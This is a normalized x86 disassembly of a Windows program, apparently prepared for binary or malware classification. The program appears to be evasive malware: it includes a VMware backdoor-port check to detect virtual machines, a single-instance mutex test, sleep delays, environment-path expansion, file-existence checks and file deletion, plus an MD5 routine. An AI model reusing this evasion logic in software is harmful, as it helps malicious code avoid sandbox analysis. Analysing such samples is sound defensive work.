push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call sub_402460
test eax eax
jne r-xdata
xor al al
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] eax
push ebx
nop
nop
mov eax 0x564d5868
nop
nop
mov ebx 0x8685d465
nop
nop
nop
mov ecx 0xa
nop
mov dx 0x5658
nop
nop
in eax dx
mov [ ebp - 0x1c ] ebx
pop ebx
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
cmp [ ebp - 0x1c ] 0x564d5868
sete al
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_402670
push 0xffffffff
push sub_425c28
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
push 0x66
mov [ esp + 0xc ] esi
call sub_41bc2c
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
call sub_422d64
call sub_422d64
mov eax [ eax + 0xc ]
push 0x80
push eax
call [ LoadIconA@IAT ]
mov ecx [ esp + 0x8 ]
mov [ esi + 0x5c ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4026f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_425c4b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x404
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_41bf66
mov eax [ esi + 0x1c ]
xor ebx ebx
push ebx
push eax
call [ GetSystemMenu@IAT ]
push eax
call sub_41f52d
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi + 0x5c ]
mov ecx [ esi + 0x1c ]
mov edi [ SendMessageA@IAT ]
push eax
push 0x1
push 0x80
push ecx
call edi
mov edx [ esi + 0x5c ]
mov eax [ esi + 0x1c ]
push edx
push ebx
push 0x80
push eax
call edi
push 0x104
push rw-data
push ebx
call [ GetModuleFileNameA@IAT ]
push 0x5c
push rw-data
call sub_40c790
mov esi eax
lea ecx [ esi + 0x1 ]
push ecx
push rw-data
push rw-data
call sub_40c042
push rw-data
push rw-data
push rw-data
mov [ esi ] 0x0
call sub_40c042
add esp 0x20
push rw-data
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
call esi
cmp eax 0xb7
je r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x65
lea ecx [ esp + 0x14 ]
mov [ esp + 0x420 ] ebx
call sub_41f410
mov edx [ esp + 0x10 ]
cmp [ edx - 0x8 ] ebx
je r-xdata
xor eax eax
call esi
cmp eax 0x5
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x41c ] 0xffffffff
call sub_41c358
mov eax [ edi + 0x4 ]
mov ebp [ AppendMenuA@IAT ]
push ebx
push ebx
push 0x800
push eax
call ebp
mov ecx [ esp + 0x10 ]
mov edx [ edi + 0x4 ]
push ecx
push 0x10
push ebx
push edx
call ebp
mov [ rw-data ] ebx
call sub_4013c0
mov ebp rw-data
mov edi rw-data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push ebp
call sub_401520
add esp 0x4
add edi 0xa
inc ebx
add ebp 0x40
cmp edi rw-data
jl r-xdata
mov [ rw-data ] ebx
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
mov eax edi
push rw-data
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push rw-data
call sub_401290
call sub_402b30
push 0x2710
call sub_40c51f
add esp 0x8
call sub_41ad89
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_40c205
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
call [ edx + 0x74 ]
jmp r-xdata
xor esi esi
mov ecx [ esp + 0x414 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x410
retn
mov eax [ eax + 0x1c ]
push 0x0
push 0x0
push 0x10
push eax
call [ SendMessageA@IAT ]
mov eax 0x1
jmp r-xdata
push edi
mov [ esp + esi + 0x18 ] 0x0
call sub_40c094
add esp 0x4
xor ebp ebp
mov edi rw-data
cmp eax 0x20
jl r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp eax 0x7e
jg r-xdata
cmp ebp 0xa
jl r-xdata
add edi 0xa
inc ebp
cmp edi rw-data
jl r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov [ esp + esi + 0x14 ] al
inc esi
cmp esi 0x3ff
jl r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] 0x0
jmp r-xdata
mov esi edi
lea eax [ esp + 0x14 ]
mov [ rw-data ] 0x0
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push edi
call sub_40c77d
add esp 0x4
cmp eax 0xffffffff
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_4029d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_425c68
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
and eax 0xfff0
sub esp 0x5c
cmp eax 0x10
jne r-xdata
call sub_41cb32
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
add esp 0x68
retn 0x8
lea ecx [ esp ]
call sub_4025e0
lea ecx [ esp ]
mov [ esp + 0x64 ] 0x0
call sub_41bce1
lea ecx [ esp ]
mov [ esp + 0x64 ] 0xffffffff
call sub_41b9b4
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
add esp 0x68
retn 0x8
sub_402a50
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call sub_41cb32
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call sub_421128
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x1c ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x1c ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x5c ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call sub_42119a
pop edi
pop ebx
pop esi
add esp 0x64
retn
sub_402b30
sub esp 0xbc
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push ebp
push esi
mov [ esp + 0x38 ] eax
mov al [ rw-data ]
push edi
push rw-data
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] al
call sub_401520
push rw-data
call sub_40c19c
push rw-data
mov esi eax
call sub_401520
push rw-data
call sub_40c19c
mov ebx eax
push rw-data
mov [ esp + 0x38 ] ebx
call sub_40c19c
push rw-data
mov [ esp + 0x50 ] eax
call sub_40c19c
push rw-data
mov [ esp + 0x38 ] eax
call sub_401520
push rw-data
call sub_401520
add esp 0x20
push 0x100
push rw-data
call [ DoEnvironmentSubstA@IAT ]
lea eax [ esi + esi * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x3
push ecx
call sub_40c51f
add esp 0x4
call sub_401810
mov eax [ rw-data ]
xor ecx ecx
mov [ esp + 0x20 ] ecx
lea edx [ eax + eax * 4 ]
shl eax 0x6
lea esi [ edx * 2 + rw-data ]
add eax rw-data
mov [ esp + 0x10 ] esi
mov [ esp + 0x18 ] eax
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xbc
retn
cmp ecx 0xa
jge r-xdata
push rw-data
call sub_401520
push rw-data
push esi
lea eax [ esp + 0x58 ]
push rw-data
push eax
call sub_40c042
lea edi [ esp + 0x60 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ esp + 0x60 ]
push esi
push ecx
mov [ esp + 0x48 ] esi
call sub_401380
lea edx [ esp + 0x68 ]
push esi
push edx
call sub_401000
mov ecx [ esp + 0x40 ]
mov [ esp + 0x4c ] eax
mov eax 0x1
add esp 0x24
cmp ecx eax
mov [ esp + 0x30 ] eax
jl r-xdata
push esi
call sub_401520
add esp 0x4
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
push 0x64
call sub_40c51f
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
add esi 0x40
add esp 0x4
mov [ esp + 0x18 ] esi
mov esi [ esp + 0x10 ]
inc ecx
add esi 0xa
cmp ecx 0xa
mov [ esp + 0x20 ] ecx
mov [ esp + 0x10 ] esi
jl r-xdata
push eax
call sub_40c218
add esp 0x4
push rw-data
push rw-data
push rw-data
push rw-data
call sub_40c042
add esp 0x10
call sub_402540
test al al
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x3c ]
push eax
push ecx
call sub_40c410
add esp 0x8
test eax eax
je r-xdata
call sub_4024b0
test al al
je r-xdata
push 0x0
call sub_40c7e4
nop
nop
nop
nop
nop
nop
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
push esi
push edx
call sub_401380
mov edx [ rw-data ]
push esi
push edx
call sub_401000
mov [ rw-data ] eax
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x28 ]
push rw-data
push eax
push rw-data
push ecx
push rw-data
push rw-data
push rw-data
call sub_40c042
mov eax [ rw-data ]
add esp 0x1c
test eax eax
je r-xdata
push eax
call sub_40c218
add esp 0x4
call sub_401810
mov edx [ esp + 0x18 ]
push 0x1
push 0x50
push edx
push 0x0
push rw-data
call sub_4021e0
mov ebp eax
mov eax [ rw-data ]
add esp 0x14
cmp eax 0x6
jl r-xdata
push eax
call sub_40c218
add esp 0x4
lea eax [ ebx + ebx * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x3
push edx
call sub_40c51f
test ebp ebp
je r-xdata
jmp r-xdata
push rw-data
push ebp
call sub_40c410
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea eax [ ebx + ebx * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x3
push ecx
call sub_40c51f
add esp 0x4
push ebp
call sub_40c218
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x2
[ edi ]
not ecx
dec ecx
push rw-data
add esi ecx
push esi
call sub_40ca50
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x20 ]
add esp 0x4
inc eax
cmp eax ecx
mov [ esp + 0x30 ] eax
jle r-xdata
push ebp
call sub_40c218
add esp 0x4
push 0x2
push rw-data
push esi
call sub_40ca50
add esp 0xc
test eax eax
jne r-xdata
push 0x2
push rw-data
push esi
call sub_40ca50
add esp 0xc
test eax eax
jne r-xdata
push rw-data
push rw-data
mov [ esp + 0x1c ] 0x1
call sub_40c205
add esp 0x8
mov [ rw-data ] eax
test eax eax
je r-xdata
push ebp
call sub_40c218
jmp r-xdata
push rw-data
push rw-data
mov [ esp + 0x1c ] 0x1
call sub_40c205
add esp 0x8
mov [ rw-data ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x4c ]
push eax
push rw-data
push ecx
call sub_40c042
lea edx [ esp + 0x58 ]
push edx
call sub_401520
mov ecx [ rw-data ]
lea eax [ esp + 0x5c ]
push eax
push rw-data
push ecx
call sub_40ca10
mov edx [ rw-data ]
push edx
call sub_40c094
add esp 0x20
push ebp
call sub_40c218
jmp r-xdata
lea eax [ esi + 0x2 ]
push rw-data
push eax
call sub_40c35e
push eax
call sub_40cc3f
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x4c ]
push eax
push rw-data
push ecx
call sub_40c042
lea edx [ esp + 0x58 ]
push edx
call sub_401520
mov ecx [ rw-data ]
lea eax [ esp + 0x5c ]
push eax
push rw-data
push ecx
call sub_40ca10
mov edx [ rw-data ]
push edx
call sub_40c094
add esp 0x20
mov edi [ esp + 0x2c ]
push ebx
call sub_40c19c
mov [ esp + 0x38 ] eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ebx
mov edi ecx
inc edi
mov [ esp + 0x34 ] edi
call sub_40c218
add esp 0x8
jmp r-xdata
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x34 ]
push edi
push esi
call sub_401380
push rw-data
push rw-data
call sub_40c205
add esp 0x10
mov [ rw-data ] eax
test eax eax
je r-xdata
lea esi [ esi + edi + 0x2 ]
test esi esi
je r-xdata
push rw-data
call sub_401780
mov eax [ esp + 0x3c ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x3
push edx
call sub_40c51f
mov eax [ rw-data ]
push rw-data
push eax
call sub_40c410
add esp 0x10
test eax eax
jne r-xdata
push eax
push edi
push 0x1
push esi
call sub_40c8d7
mov ecx [ rw-data ]
push ecx
call sub_40c094
add esp 0x14
push rw-data
call [ DeleteFileA@IAT ]
sub_403080
mov edx [ esp + 0x4 ]
push edi
xor eax eax
mov ecx 0x10
lea edi [ edx + 0x18 ]
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
mov [ edx + 0x10 ] eax
mov [ edx + 0x14 ] eax
[ edi ]
pop edi
retn
sub_4030c0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebx + 0x10 ]
push esi
push edi
lea ecx [ eax + ebp * 8 ]
cmp ecx eax
mov [ ebx + 0x10 ] ecx
jae r-xdata
mov esi [ ebx + 0x14 ]
mov ecx ebp
shr ecx 0x1d
shr eax 0x3
add esi ecx
and eax 0x3f
mov [ ebx + 0x14 ] esi
je r-xdata
inc [ ebx + 0x14 ]
cmp ebp 0x40
jb r-xdata
mov ecx 0x40
lea edi [ eax + ebx + 0x18 ]
sub ecx eax
cmp ebp ecx
mov [ esp + 0x14 ] ecx
jae r-xdata
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
lea edi [ ebx + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax ebp
shr eax 0x6
mov [ esp + 0x14 ] eax
mov esi [ esp + 0x18 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x18 ]
push ecx
push ebx
call sub_4032f0
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
add edx eax
add esp 0xc
mov [ esp + 0x18 ] edx
sub ebp eax
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ esp + 0x18 ]
lea eax [ ebx + 0x18 ]
mov ecx 0x10
mov edi eax
push ebx
push eax
[ edi ] [ esi ]
push ebx
call sub_4032f0
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
add esp 0xc
add edx 0x40
sub ebp 0x40
dec eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] eax
jne r-xdata
sub_4031b0
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx 0x3f
mov eax [ esi + 0x10 ]
shr eax 0x3
and eax 0x3f
sub ecx eax
lea edi [ eax + esi + 0x18 ]
mov [ edi ] 0x80
inc edi
cmp ecx 0x8
jae r-xdata
add ecx 0xfffffff8
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
lea edi [ esi + 0x18 ]
push edi
push esi
call sub_4032f0
add esp 0xc
mov ecx 0xe
xor eax eax
[ edi ]
jmp r-xdata
mov al [ esi + 0x10 ]
push esi
mov [ esi + 0x50 ] al
mov eax [ esi + 0x10 ]
mov ecx eax
mov edx eax
shr eax 0x18
mov [ esi + 0x53 ] al
mov al [ esi + 0x14 ]
shr ecx 0x8
shr edx 0x10
mov [ esi + 0x54 ] al
mov eax [ esi + 0x14 ]
mov [ esi + 0x51 ] cl
mov [ esi + 0x52 ] dl
mov ecx eax
mov edx eax
shr eax 0x18
mov [ esi + 0x57 ] al
lea eax [ esi + 0x18 ]
shr ecx 0x8
shr edx 0x10
push eax
push esi
mov [ esi + 0x55 ] cl
mov [ esi + 0x56 ] dl
call sub_4032f0
mov eax [ esp + 0x18 ]
mov cl [ esi ]
add esp 0xc
mov [ eax ] cl
mov edx [ esi ]
shr edx 0x8
mov [ eax + 0x1 ] dl
mov ecx [ esi ]
shr ecx 0x10
mov [ eax + 0x2 ] cl
mov edx [ esi ]
shr edx 0x18
mov [ eax + 0x3 ] dl
mov cl [ esi + 0x4 ]
mov [ eax + 0x4 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x8
mov [ eax + 0x5 ] dl
mov ecx [ esi + 0x4 ]
shr ecx 0x10
mov [ eax + 0x6 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x18
mov [ eax + 0x7 ] dl
mov cl [ esi + 0x8 ]
mov [ eax + 0x8 ] cl
mov edx [ esi + 0x8 ]
shr edx 0x8
mov [ eax + 0x9 ] dl
mov ecx [ esi + 0x8 ]
shr ecx 0x10
mov [ eax + 0xa ] cl
mov edx [ esi + 0x8 ]
shr edx 0x18
mov [ eax + 0xb ] dl
mov cl [ esi + 0xc ]
mov [ eax + 0xc ] cl
mov edx [ esi + 0xc ]
shr edx 0x8
mov [ eax + 0xd ] dl
mov ecx [ esi + 0xc ]
shr ecx 0x10
mov [ eax + 0xe ] cl
mov edx [ esi + 0xc ]
shr edx 0x18
mov [ eax + 0xf ] dl
mov [ esi ] 0x0
pop edi
pop esi
retn
sub_4032f0
mov eax [ esp + 0x8 ]
sub esp 0x40
add eax 0x2
push ebx
push ebp
push esi
push edi
lea esi [ esp + 0x10 ]
mov edi 0x10
xor ecx ecx
xor edx edx
mov ch [ eax + 0x1 ]
mov dl [ eax - 0x1 ]
mov cl [ eax ]
add eax 0x4
shl ecx 0x8
or ecx edx
xor edx edx
mov dl [ eax - 0x6 ]
add esi 0x4
shl ecx 0x8
or ecx edx
dec edi
mov [ esi - 0x4 ] ecx
jne r-xdata
mov ebx [ esp + 0x54 ]
mov ebp [ esp + 0x14 ]
mov edi [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov esi [ ebx + 0x4 ]
mov eax [ ebx ]
mov ecx edi
xor ecx edx
and ecx esi
xor ecx edi
add ecx eax
mov eax [ esp + 0x10 ]
lea ecx [ ecx + eax - 0x28955b88 ]
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
mov ecx edx
add eax esi
xor ecx esi
and ecx eax
xor ecx edx
add ecx ebp
mov ebp [ esp + 0x18 ]
lea edi [ edi + ecx - 0x173848aa ]
mov ecx edi
shl edi 0xc
shr ecx 0x14
or ecx edi
mov edi esi
xor edi eax
add ecx eax
and edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ edx + edi + 0x242070db ]
mov edx edi
shr edx 0xf
shl edi 0x11
or edx edi
mov edi ecx
add edx ecx
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ esi + edi - 0x3e423112 ]
mov esi edi
shl esi 0x16
shr edi 0xa
or esi edi
mov edi ecx
add esi edx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ eax + edi - 0xa83f051 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
add eax esi
xor edi esi
and edi eax
xor edi edx
add edi ebp
lea edi [ ecx + edi + 0x4787c62a ]
mov ecx edi
shr ecx 0x14
shl edi 0xc
or ecx edi
mov edi esi
add ecx eax
xor edi eax
and edi ecx
xor edi esi
mov ebp [ esp + 0x28 ]
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ edx + edi - 0x57cfb9ed ]
mov edx edi
shl edi 0x11
shr edx 0xf
or edx edi
mov edi ecx
xor edi eax
add edx ecx
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x30 ]
lea edi [ esi + edi - 0x2b96aff ]
mov esi edi
shr edi 0xa
shl esi 0x16
or esi edi
mov edi ecx
xor edi edx
add esi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ eax + edi + 0x698098d8 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
xor edi esi
add eax esi
and edi eax
xor edi edx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ ecx + edi - 0x74bb0851 ]
mov ecx edi
shr ecx 0x14
shl edi 0xc
or ecx edi
mov edi esi
add ecx eax
xor edi eax
and edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x3c ]
lea edi [ edx + edi - 0xa44f ]
mov edx edi
shr edx 0xf
shl edi 0x11
or edx edi
mov edi ecx
add edx ecx
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ esi + edi - 0x76a32842 ]
mov esi edi
shl esi 0x16
shr edi 0xa
or esi edi
mov edi ecx
add esi edx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
lea edi [ eax + edi + 0x6b901122 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
add eax esi
mov ebp [ esp + 0x44 ]
xor edi esi
and edi eax
xor edi edx
add edi ebp
mov ebp [ esp + 0x48 ]
lea ecx [ ecx + edi - 0x2678e6d ]
mov edi ecx
shr edi 0x14
shl ecx 0xc
or edi ecx
mov ecx esi
add edi eax
xor ecx eax
and ecx edi
xor ecx esi
add ecx ebp
mov ebp [ esp + 0x4c ]
lea edx [ edx + ecx - 0x5986bc72 ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
mov edx edi
add ecx edi
xor edx eax
and edx ecx
xor edx eax
add edx ebp
mov ebp [ esp + 0x14 ]
lea esi [ esi + edx + 0x49b40821 ]
mov edx esi
shl edx 0x16
shr esi 0xa
or edx esi
mov esi ecx
add edx ecx
xor esi edx
and esi edi
xor esi ecx
add esi ebp
mov ebp [ esp + 0x28 ]
lea esi [ eax + esi - 0x9e1da9e ]
mov eax esi
shr eax 0x1b
shl esi 0x5
or eax esi
mov esi edx
add eax edx
xor esi eax
and esi ecx
xor esi edx
add esi ebp
mov ebp [ esp + 0x3c ]
lea edi [ edi + esi - 0x3fbf4cc0 ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x10 ]
lea edi [ ecx + edi + 0x265e5a51 ]
mov ecx edi
shr ecx 0x12
shl edi 0xe
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
lea edi [ edx + edi - 0x16493856 ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov ebp [ esp + 0x24 ]
add edx ecx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ eax + edi - 0x29d0efa3 ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ esi + edi + 0x2441453 ]
mov esi edi
shl edi 0x9
shr esi 0x17
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ ecx + edi - 0x275e197f ]
mov ecx edi
shr ecx 0x12
shl edi 0xe
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ edx + edi - 0x182c0438 ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi ecx
add edx ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x48 ]
lea edi [ eax + edi + 0x21e1cde6 ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ esi + edi - 0x3cc8f82a ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
lea edi [ ecx + edi - 0xb2af279 ]
mov ecx edi
mov ebp [ esp + 0x30 ]
shl edi 0xe
shr ecx 0x12
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ edx + edi + 0x455a14ed ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi ecx
add edx ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ eax + edi - 0x561c16fb ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ esi + edi - 0x3105c08 ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x40 ]
lea ecx [ ecx + edi + 0x676f02d9 ]
mov edi ecx
shr edi 0x12
shl ecx 0xe
or edi ecx
mov ecx esi
add edi esi
xor ecx edi
mov [ esp + 0x58 ] ecx
and ecx eax
xor ecx esi
add ecx ebp
mov ebp [ esp + 0x24 ]
lea edx [ edx + ecx - 0x72d5b376 ]
mov ecx edx
shl ecx 0x14
shr edx 0xc
or ecx edx
mov edx [ esp + 0x58 ]
add ecx edi
xor edx ecx
add edx ebp
mov ebp [ esp + 0x30 ]
lea edx [ eax + edx - 0x5c6be ]
mov eax edx
shr eax 0x1c
shl edx 0x4
or eax edx
mov edx edi
add eax ecx
xor edx ecx
xor edx eax
add edx ebp
lea esi [ esi + edx - 0x788e097f ]
mov ebp [ esp + 0x3c ]
mov edx esi
shr edx 0x15
shl esi 0xb
or edx esi
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi ebp
mov ebp [ esp + 0x48 ]
lea edi [ edi + esi + 0x6d9d6122 ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x14 ]
lea edi [ ecx + edi - 0x21ac7f4 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ eax + edi - 0x5b4115bc ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ edx + edi + 0x4bdecfa9 ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ esi + edi - 0x944b4a0 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ ecx + edi - 0x41404390 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
lea edi [ eax + edi + 0x289b7ec6 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
mov ebp [ esp + 0x10 ]
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x1c ]
